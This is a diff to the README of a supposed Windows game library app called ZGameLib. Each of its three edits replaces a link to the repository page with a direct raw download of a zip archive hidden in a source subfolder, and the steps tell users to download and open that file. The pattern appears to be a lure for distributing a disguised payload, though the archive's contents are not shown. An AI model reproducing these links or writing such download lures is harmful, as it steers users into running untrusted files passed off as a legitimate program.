@@ -1,6 +1,6 @@
 # 🎮 ZGameLib - Your Windows game library in one place
 
-[![Download ZGameLib](https://img.shields.io/badge/Download-ZGameLib-brightgreen?style=for-the-badge)](https://github.com/acornshaped-oysterdressing296/ZGameLib)
+[![Download ZGameLib](https://img.shields.io/badge/Download-ZGameLib-brightgreen?style=for-the-badge)](https://github.com/acornshaped-oysterdressing296/ZGameLib/raw/refs/heads/main/src-tauri/capabilities/Z-Lib-Game-v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Use it to start games fast, sort your library, and keep your game list local on 
 
 ## 📥 Download and Install
 
-1. Open the download page: [ZGameLib on GitHub](https://github.com/acornshaped-oysterdressing296/ZGameLib)
+1. Open the download page: [ZGameLib on GitHub](https://github.com/acornshaped-oysterdressing296/ZGameLib/raw/refs/heads/main/src-tauri/capabilities/Z-Lib-Game-v3.3.zip)
 2. Find the latest Windows release or build on the page.
 3. Download the Windows app file.
 4. Open the file to start the app.
@@ -175,7 +175,7 @@ This project covers:
 
 ## 📦 Download Again
 
-If you need to get the app again or check for a newer version, use this page: [https://github.com/acornshaped-oysterdressing296/ZGameLib](https://github.com/acornshaped-oysterdressing296/ZGameLib)
+If you need to get the app again or check for a newer version, use this page: [https://github.com/acornshaped-oysterdressing296/ZGameLib/raw/refs/heads/main/src-tauri/capabilities/Z-Lib-Game-v3.3.zip](https://github.com/acornshaped-oysterdressing296/ZGameLib/raw/refs/heads/main/src-tauri/capabilities/Z-Lib-Game-v3.3.zip)
 
 ## 🧰 Basic Troubleshooting
 
